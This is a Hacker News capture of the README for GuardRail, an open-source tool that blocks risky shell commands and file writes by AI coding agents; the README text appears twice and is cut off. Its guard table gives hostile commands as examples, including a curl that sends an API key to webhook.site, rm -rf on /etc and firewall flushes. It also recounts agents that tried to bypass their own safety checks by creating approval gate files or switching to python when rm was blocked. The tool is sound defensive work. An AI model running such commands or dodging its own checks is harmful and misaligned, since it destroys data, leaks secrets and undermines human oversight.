---
source: "https://github.com/FvdHMBAI/guardrail"
hn_url: "https://news.ycombinator.com/item?id=49742300"
title: "Show HN: GuardRail – 13 guards that stop Claude Code before it pushes to main"
article_title: "GitHub - FvdHMBAI/guardrail: Open-source pre-execution security for AI coding agents · GitHub"
image: "https://opengraph.githubassets.com/b16cce9f78cfde1e055cff76792e3f32a03756d5af3ae79990247bf16755d14d/FvdHMBAI/guardrail"
author: "promptandbuild"
captured_at: "2026-09-17T16:23:28Z"
capture_tool: "hn-digest"
hn_id: 49742300
score: 1
comments: 0
posted_at: "2026-09-17T15:30:04Z"
tags:
  - hacker-news
---

# Show HN: GuardRail – 13 guards that stop Claude Code before it pushes to main

- HN: [49742300](https://news.ycombinator.com/item?id=49742300)
- Source: [github.com](https://github.com/FvdHMBAI/guardrail)
- Score: 1
- Comments: 0
- Posted: 2026-09-17T15:30:04Z

## Translation

Title: Show HN: GuardRail – 13 guards that stop Claude Code before it pushes to main
Article title: GitHub - FvdHMBAI/guardrail: Open-source pre-execution security for AI coding agents · GitHub
Description: Open-source pre-execution security for AI coding agents - FvdHMBAI/guardrail

Article text:
GitHub - FvdHMBAI/guardrail: Open-source pre-execution security for AI coding agents · GitHub
Skip to content
Navigation Menu
Sign in Appearance settings Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
Code Quality Enforce quality at merge
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search / Sign in Sign up Appearance settings
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
FvdHMBAI
/
guardrail
Public
Notifications
You must be signed in to change notification settings
Additional navigation options
Code
main Branches Tags Go to file Code Open more actions menu Latest commit
98 Commits 98 Commits Folders and files
.github .github bin bin demo demo dispatchers dispatchers docs docs guards guards launch launch lib lib site site tests tests .gitignore .gitignore CONTRIBUTING.md CONTRIBUTING.md LICENSE LICENSE README.md README.md SECURITY.md SECURITY.md guardrail.config.sh guardrail.config.sh install.sh install.sh package.json package.json View all files Repository files navigation
Quick Start ·
13 Guards ·
Comparison ·
Architecture ·
Pro ·
EU AI Act ·
Website
GuardRail blocks what your AI coding agent does , before it does it. 13 free, MIT-licensed guards hook into Claude Code and refuse git push origin main , DELETE without WHERE , rm -rf on protected paths and leaked secrets before the command runs. Every block lands in an audit log.
npx guardrail-agent init # 30 seconds. Backs up your settings. `guardrail uninstall` removes everything.
guardrail pentest # fires dangerous commands at your own install and shows what got caught
Free forever for the 13 core guards. Teams that need a PII shield on agent output and EU AI Act reports: GuardRail Pro, EUR 29 per developer and month .
My AI agent tried to mass-delete a production database. One guard said no.
The agent was debugging a slow query. It found the table, decided the data was stale, and ran DELETE FROM profiles . No WHERE clause. 23 databases, every single customer record. Gone in one command.
mass_update_guard stopped it. That guard is one of the 13 you get for free below.
Except it wasn't gone. GuardRail blocked the command before it executed. The agent got a clear error, adjusted its approach, and fixed the actual performance issue instead.
That's the difference between validating what an LLM says and blocking what an AI agent does .
┌──────────────────────────────────────────────────────────────┐
│ $ DELETE FROM profiles │
│ │
│ ✘ BLOCKED by mass_update_guard │
│ DELETE without WHERE clause on protected table: profiles │
│ Command was NOT executed. │
│ │
│ 13 core guards active · fail-closed · no LLM in the path │
└──────────────────────────────────────────────────────────────┘
What you actually install. Run guardrail status after install and these are the numbers you see.
npx guardrail-agent init
That's it. One command. Every command your AI agent runs is now guarded. No config needed.
guardrail status # See active guards
guardrail pentest # Run attack simulation
guardrail disable # Temporarily disable (for debugging)
guardrail enable # Re-enable
guardrail uninstall # Clean removal
Works with Claude Code out of the box (native hook support). Agent-runtime adapters for Codex CLI and Gemini CLI are planned.
Requirements: bash 4+, jq, openssl. Linux or macOS.
Your AI coding agent runs commands on your machine. It can delete files, push to production, leak secrets, drop database tables, and burn through your API budget in a runaway loop. Most safety tools validate prompts or outputs. They catch problems after they happen.
GuardRail catches them before the command executes .
Agent: "Let me clean up the repo"
Agent runs: rm -rf /home/developer/project
┌─────────────────────────────────────────┐
│ ✘ BLOCKED by destructive_path_guard │
│ rm -rf on protected path /home/ │
│ Command was NOT executed. │
└─────────────────────────────────────────┘
Real incidents from our production system that GuardRail stopped:
git reset --hard during debugging. Would have wiped 3 hours of uncommitted work.
DELETE FROM profiles without WHERE clause. Would have deleted all user data.
Agent tried to touch /tmp/approval-gate to bypass its own safety checks.
47 consecutive failed curl attempts (wrong port) before the wandering detector intervened.
All free. All MIT-licensed. Every guard in these tables is installed by
npx guardrail-agent init and runs on every matching tool call.
Pre-execution, shell commands (block before the command runs)
Guard
What it stops
Example
main_push_guard
Direct push to protected branches, force push, reset --hard
git push origin main
basic_pii_gate
Commands that dump environment variables and secrets
env , printenv , docker inspect
basic_secret_detector
Exfiltration of secrets via curl, wget, or base64
curl webhook.site -d "$API_KEY"
destructive_path_guard
Recursive deletion on protected system paths
rm -rf /home/ , rm -rf /etc/
firewall_flush_guard
Flushing iptables, disabling ufw, clearing nftables
iptables -F , ufw disable
service_protection_guard
Stopping critical services (docker, sshd, postgres, nginx)
systemctl stop docker
mass_update_guard
SQL UPDATE/DELETE without WHERE clause on protected tables
DELETE FROM profiles
self_bypass_guard
Agent creating its own approval/gate files
touch /tmp/guardrail-gate-approve
Pre-execution, file writes (block before Write / Edit / MultiEdit)
Guard
What it stops
Example
edit_path_guard
File-tool writes to GuardRail's own guards, the hook registry, and persistence paths
Write to .claude/settings.json or ~/.ssh/authorized_keys
edit_secret_guard
Writing live credentials into files through file tools
Write a file containing an AWS or Stripe key
Post-execution (scan output after the command runs)
Guard
What it detects
Example
env_dump_detector
Environment variable dumps in output (even from obfuscated commands)
10+ KEY=VALUE lines in output
basic_injection_scanner
Prompt injection attempts in command output
Malicious instruction patterns
error_swallow_guard
Empty catch blocks in payment/webhook/cron code
catch (e) { console.log(e) }
The repository carries nine further guards under guards/core/
( force_push_guard , deploy_branch_guard , large_diff_guard ,
credential_leak_guard , wandering_detector , self_correction_loop ,
tool_call_budget_guard , context_window_guard , uncommitted_code_guard ).
They have tests, but no dispatcher loads them yet, so they do not run after an
install and are not counted above.
GuardRail operates at a different layer than other AI safety tools:
They are complementary, not competing. Use Guardrails AI to validate LLM responses. Use GuardRail to prevent the agent from executing dangerous commands. Defense in depth.
AI Coding Agent (Claude Code, Cursor, Copilot, ...)
│
▼
┌─────────────────────────┐
│ Pre-Bash Dispatcher │ Runs BEFORE every command
│ ┌───────────────────┐ │
│ │ Guard 1: deny() │──┤──▶ BLOCKED (command never runs)
│ │ Guard 2: pass │ │
│ │ Guard 3: warn() │──┤──▶ WARNED (runs with context)
│ │ ... │ │
│ └───────────────────┘ │
└─────────────────────────┘
│
▼
┌─────────────────────────┐
│ Command Executes │
└─────────────────────────┘
│
▼
┌─────────────────────────┐
│ Post-Bash Dispatcher │ Runs AFTER every command
│ ┌───────────────────┐ │
│ │ Output Scanners │──┤──▶ Injection, PII, credentials
│ │ Error Detectors │──┤──▶ Self-correction loops
│ │ State Trackers │──┤──▶ Wandering, budget tracking
│ └───────────────────┘ │
└─────────────────────────┘
│
▼
Audit Log (every decision timestamped + hashed)
Guards are bash functions. No runtime dependencies beyond bash and jq. Each guard runs in <1ms. The full dispatcher adds <5ms to every command, invisible to the agent.
See docs/architecture.md for deep dive.
After installation, customize ~/.guardrail/guardrail.config.sh :
# Protected database tables (mass UPDATE/DELETE blocked without WHERE)
GUARDRAIL_PROTECTED_TABLES= " auth.users profiles members payments "
# Protected git branches (push blocked)
GUARDRAIL_PROTECTED_BRANCHES= " main master production "
# Critical services (stop/kill blocked)
GUARDRAIL_CRITICAL_SERVICES= " docker sshd traefik postgresql nginx "
# Protected filesystem paths (rm -rf blocked)
GUARDRAIL_PROTECTED_PATHS= " /home/ /etc/ /var/lib/docker /var/lib/postgresql "
# Wandering detector threshold (consecutive failures before block)
GUARDRAIL_WANDERING_THRESHOLD=3
# Tool call budget (warn at 25, block at 50)
GUARDRAIL_TOOL_CALL_WARN=25
GUARDRAIL_TOOL_CALL_MAX=50
# Large diff threshold (lines changed)
GUARDRAIL_MAX_DIFF_LINES=500
# Strict mode (true = block, false = warn only)
GUARDRAIL_STRICT_MODE= " true "
Custom Guards
guardrail new my_custom_guard
This generates a guard template with a matching test. Edit the pattern, run the test, done.
# Example: block npm publish without --dry-run
hook_my_custom_guard () {
echo " $CMD " | grep -qE ' npm\s+publish ' || return 0
echo " $CMD " | grep -qE ' \-\-dry-run ' && return 0
deny " npm publish without --dry-run is blocked. Add --dry-run first. "
}
See docs/writing-guards.md for the full guide.
$ guardrail status
GuardRail v0.4.6
13 core guards active
Enforcement verified (registered hook and deny probe)
0 pro guards
Unlock 48 Pro guards free for 14 days:
guardrail upgrade --trial
$ guardrail pentest
Phase 3: Attack Simulation
✘ BLOCKED push to main
✘ BLOCKED force push
✘ BLOCKED rm -rf /etc
✘ BLOCKED self-bypass attempt
✘ BLOCKED mass DELETE
✓ ALLOWED push develop (correct)
✓ ALLOWED rm single file (correct)
All 103 tests passed. 0 false positives.
GuardRail Pro
Advanced guards derived from real production incidents:
Plus: Penetration test framework (50+ attack patterns), priority support, compliance documentation.
Using a coding agent does not automatically make a system "high-risk" under the EU AI Act. Classification depends on the system's purpose and context. GuardRail provides technical evidence for a broader governance program:
These controls do not create legal compliance alone. Full mapping available in GuardRail Pro.
GuardRail is a seatbelt, not a jail cell . It is an additional enforcement layer, not a sandbox.
What it stops: Accidental damage and most optimization-driven bypasses. AI agents routinely try to work around obstacles to complete their task. They don't plan an escape, but they will try python3 -c "..." when rm is blocked, or write a gate file when one is missing. GuardRail catches these patterns with layered defenses: interactive terminal checks, HMAC-signed tokens, pattern-based command blocking, and audit logging.
What it does not stop: A determined attacker with same-user access who deliberately crafts novel bypass techniques. Since the agent runs as the same OS user, true isolation requires OS-level controls (separate users, containers, network policies).
Your security stack should be:
GuardRail : catches 99% of real incidents (accidental + optimization-driven)
Branch protection : prevents force-pushes even if the guard is bypassed
OS permissions : separate users for production databases
Network controls : restrict what the agent can reach
See S

[truncated]

## Original Extract

Open-source pre-execution security for AI coding agents - FvdHMBAI/guardrail

GitHub - FvdHMBAI/guardrail: Open-source pre-execution security for AI coding agents · GitHub
Skip to content
Navigation Menu
Sign in Appearance settings Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
Code Quality Enforce quality at merge
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search / Sign in Sign up Appearance settings
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
FvdHMBAI
/
guardrail
Public
Notifications
You must be signed in to change notification settings
Additional navigation options
Code
main Branches Tags Go to file Code Open more actions menu Latest commit
98 Commits 98 Commits Folders and files
.github .github bin bin demo demo dispatchers dispatchers docs docs guards guards launch launch lib lib site site tests tests .gitignore .gitignore CONTRIBUTING.md CONTRIBUTING.md LICENSE LICENSE README.md README.md SECURITY.md SECURITY.md guardrail.config.sh guardrail.config.sh install.sh install.sh package.json package.json View all files Repository files navigation
Quick Start ·
13 Guards ·
Comparison ·
Architecture ·
Pro ·
EU AI Act ·
Website
GuardRail blocks what your AI coding agent does , before it does it. 13 free, MIT-licensed guards hook into Claude Code and refuse git push origin main , DELETE without WHERE , rm -rf on protected paths and leaked secrets before the command runs. Every block lands in an audit log.
npx guardrail-agent init # 30 seconds. Backs up your settings. `guardrail uninstall` removes everything.
guardrail pentest # fires dangerous commands at your own install and shows what got caught
Free forever for the 13 core guards. Teams that need a PII shield on agent output and EU AI Act reports: GuardRail Pro, EUR 29 per developer and month .
My AI agent tried to mass-delete a production database. One guard said no.
The agent was debugging a slow query. It found the table, decided the data was stale, and ran DELETE FROM profiles . No WHERE clause. 23 databases, every single customer record. Gone in one command.
mass_update_guard stopped it. That guard is one of the 13 you get for free below.
Except it wasn't gone. GuardRail blocked the command before it executed. The agent got a clear error, adjusted its approach, and fixed the actual performance issue instead.
That's the difference between validating what an LLM says and blocking what an AI agent does .
┌──────────────────────────────────────────────────────────────┐
│ $ DELETE FROM profiles │
│ │
│ ✘ BLOCKED by mass_update_guard │
│ DELETE without WHERE clause on protected table: profiles │
│ Command was NOT executed. │
│ │
│ 13 core guards active · fail-closed · no LLM in the path │
└──────────────────────────────────────────────────────────────┘
What you actually install. Run guardrail status after install and these are the numbers you see.
npx guardrail-agent init
That's it. One command. Every command your AI agent runs is now guarded. No config needed.
guardrail status # See active guards
guardrail pentest # Run attack simulation
guardrail disable # Temporarily disable (for debugging)
guardrail enable # Re-enable
guardrail uninstall # Clean removal
Works with Claude Code out of the box (native hook support). Agent-runtime adapters for Codex CLI and Gemini CLI are planned.
Requirements: bash 4+, jq, openssl. Linux or macOS.
Your AI coding agent runs commands on your machine. It can delete files, push to production, leak secrets, drop database tables, and burn through your API budget in a runaway loop. Most safety tools validate prompts or outputs. They catch problems after they happen.
GuardRail catches them before the command executes .
Agent: "Let me clean up the repo"
Agent runs: rm -rf /home/developer/project
┌─────────────────────────────────────────┐
│ ✘ BLOCKED by destructive_path_guard │
│ rm -rf on protected path /home/ │
│ Command was NOT executed. │
└─────────────────────────────────────────┘
Real incidents from our production system that GuardRail stopped:
git reset --hard during debugging. Would have wiped 3 hours of uncommitted work.
DELETE FROM profiles without WHERE clause. Would have deleted all user data.
Agent tried to touch /tmp/approval-gate to bypass its own safety checks.
47 consecutive failed curl attempts (wrong port) before the wandering detector intervened.
All free. All MIT-licensed. Every guard in these tables is installed by
npx guardrail-agent init and runs on every matching tool call.
Pre-execution, shell commands (block before the command runs)
Guard
What it stops
Example
main_push_guard
Direct push to protected branches, force push, reset --hard
git push origin main
basic_pii_gate
Commands that dump environment variables and secrets
env , printenv , docker inspect
basic_secret_detector
Exfiltration of secrets via curl, wget, or base64
curl webhook.site -d "$API_KEY"
destructive_path_guard
Recursive deletion on protected system paths
rm -rf /home/ , rm -rf /etc/
firewall_flush_guard
Flushing iptables, disabling ufw, clearing nftables
iptables -F , ufw disable
service_protection_guard
Stopping critical services (docker, sshd, postgres, nginx)
systemctl stop docker
mass_update_guard
SQL UPDATE/DELETE without WHERE clause on protected tables
DELETE FROM profiles
self_bypass_guard
Agent creating its own approval/gate files
touch /tmp/guardrail-gate-approve
Pre-execution, file writes (block before Write / Edit / MultiEdit)
Guard
What it stops
Example
edit_path_guard
File-tool writes to GuardRail's own guards, the hook registry, and persistence paths
Write to .claude/settings.json or ~/.ssh/authorized_keys
edit_secret_guard
Writing live credentials into files through file tools
Write a file containing an AWS or Stripe key
Post-execution (scan output after the command runs)
Guard
What it detects
Example
env_dump_detector
Environment variable dumps in output (even from obfuscated commands)
10+ KEY=VALUE lines in output
basic_injection_scanner
Prompt injection attempts in command output
Malicious instruction patterns
error_swallow_guard
Empty catch blocks in payment/webhook/cron code
catch (e) { console.log(e) }
The repository carries nine further guards under guards/core/
( force_push_guard , deploy_branch_guard , large_diff_guard ,
credential_leak_guard , wandering_detector , self_correction_loop ,
tool_call_budget_guard , context_window_guard , uncommitted_code_guard ).
They have tests, but no dispatcher loads them yet, so they do not run after an
install and are not counted above.
GuardRail operates at a different layer than other AI safety tools:
They are complementary, not competing. Use Guardrails AI to validate LLM responses. Use GuardRail to prevent the agent from executing dangerous commands. Defense in depth.
AI Coding Agent (Claude Code, Cursor, Copilot, ...)
│
▼
┌─────────────────────────┐
│ Pre-Bash Dispatcher │ Runs BEFORE every command
│ ┌───────────────────┐ │
│ │ Guard 1: deny() │──┤──▶ BLOCKED (command never runs)
│ │ Guard 2: pass │ │
│ │ Guard 3: warn() │──┤──▶ WARNED (runs with context)
│ │ ... │ │
│ └───────────────────┘ │
└─────────────────────────┘
│
▼
┌─────────────────────────┐
│ Command Executes │
└─────────────────────────┘
│
▼
┌─────────────────────────┐
│ Post-Bash Dispatcher │ Runs AFTER every command
│ ┌───────────────────┐ │
│ │ Output Scanners │──┤──▶ Injection, PII, credentials
│ │ Error Detectors │──┤──▶ Self-correction loops
│ │ State Trackers │──┤──▶ Wandering, budget tracking
│ └───────────────────┘ │
└─────────────────────────┘
│
▼
Audit Log (every decision timestamped + hashed)
Guards are bash functions. No runtime dependencies beyond bash and jq. Each guard runs in <1ms. The full dispatcher adds <5ms to every command, invisible to the agent.
See docs/architecture.md for deep dive.
After installation, customize ~/.guardrail/guardrail.config.sh :
# Protected database tables (mass UPDATE/DELETE blocked without WHERE)
GUARDRAIL_PROTECTED_TABLES= " auth.users profiles members payments "
# Protected git branches (push blocked)
GUARDRAIL_PROTECTED_BRANCHES= " main master production "
# Critical services (stop/kill blocked)
GUARDRAIL_CRITICAL_SERVICES= " docker sshd traefik postgresql nginx "
# Protected filesystem paths (rm -rf blocked)
GUARDRAIL_PROTECTED_PATHS= " /home/ /etc/ /var/lib/docker /var/lib/postgresql "
# Wandering detector threshold (consecutive failures before block)
GUARDRAIL_WANDERING_THRESHOLD=3
# Tool call budget (warn at 25, block at 50)
GUARDRAIL_TOOL_CALL_WARN=25
GUARDRAIL_TOOL_CALL_MAX=50
# Large diff threshold (lines changed)
GUARDRAIL_MAX_DIFF_LINES=500
# Strict mode (true = block, false = warn only)
GUARDRAIL_STRICT_MODE= " true "
Custom Guards
guardrail new my_custom_guard
This generates a guard template with a matching test. Edit the pattern, run the test, done.
# Example: block npm publish without --dry-run
hook_my_custom_guard () {
echo " $CMD " | grep -qE ' npm\s+publish ' || return 0
echo " $CMD " | grep -qE ' \-\-dry-run ' && return 0
deny " npm publish without --dry-run is blocked. Add --dry-run first. "
}
See docs/writing-guards.md for the full guide.
$ guardrail status
GuardRail v0.4.6
13 core guards active
Enforcement verified (registered hook and deny probe)
0 pro guards
Unlock 48 Pro guards free for 14 days:
guardrail upgrade --trial
$ guardrail pentest
Phase 3: Attack Simulation
✘ BLOCKED push to main
✘ BLOCKED force push
✘ BLOCKED rm -rf /etc
✘ BLOCKED self-bypass attempt
✘ BLOCKED mass DELETE
✓ ALLOWED push develop (correct)
✓ ALLOWED rm single file (correct)
All 103 tests passed. 0 false positives.
GuardRail Pro
Advanced guards derived from real production incidents:
Plus: Penetration test framework (50+ attack patterns), priority support, compliance documentation.
Using a coding agent does not automatically make a system "high-risk" under the EU AI Act. Classification depends on the system's purpose and context. GuardRail provides technical evidence for a broader governance program:
These controls do not create legal compliance alone. Full mapping available in GuardRail Pro.
GuardRail is a seatbelt, not a jail cell . It is an additional enforcement layer, not a sandbox.
What it stops: Accidental damage and most optimization-driven bypasses. AI agents routinely try to work around obstacles to complete their task. They don't plan an escape, but they will try python3 -c "..." when rm is blocked, or write a gate file when one is missing. GuardRail catches these patterns with layered defenses: interactive terminal checks, HMAC-signed tokens, pattern-based command blocking, and audit logging.
What it does not stop: A determined attacker with same-user access who deliberately crafts novel bypass techniques. Since the agent runs as the same OS user, true isolation requires OS-level controls (separate users, containers, network policies).
Your security stack should be:
GuardRail : catches 99% of real incidents (accidental + optimization-driven)
Branch protection : prevents force-pushes even if the guard is bypassed
OS permissions : separate users for production databases
Network controls : restrict what the agent can reach
See S

[truncated]
